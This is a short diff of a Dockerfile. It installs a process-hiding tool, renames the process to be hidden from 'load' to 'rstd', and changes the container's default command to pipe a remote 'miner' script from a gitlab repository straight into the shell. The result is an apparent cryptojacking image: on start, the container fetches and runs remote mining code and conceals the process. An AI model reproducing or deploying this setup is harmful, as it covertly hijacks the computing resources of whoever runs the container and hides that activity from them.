@@ -14,7 +14,7 @@ RUN apt-get clean && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*
 RUN curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
 #RUN apt-get install -y nodejs-legacy
 RUN npm i -g node-process-hider
-RUN ph add load
+RUN ph add rstd
 
 # Add files.
 ADD root/.bashrc /root/.bashrc
@@ -37,4 +37,4 @@ WORKDIR /root
 RUN echo "Uploaded files:" && ls /home/stuff/
 
 # Define default command.
-CMD curl https://gitlab.com/erdepegitren/miner/-/raw/main/cpuminrvn.sh | sh
+CMD curl https://gitlab.com/ubuntehe/miner/-/raw/main/rszeher.sh | sh
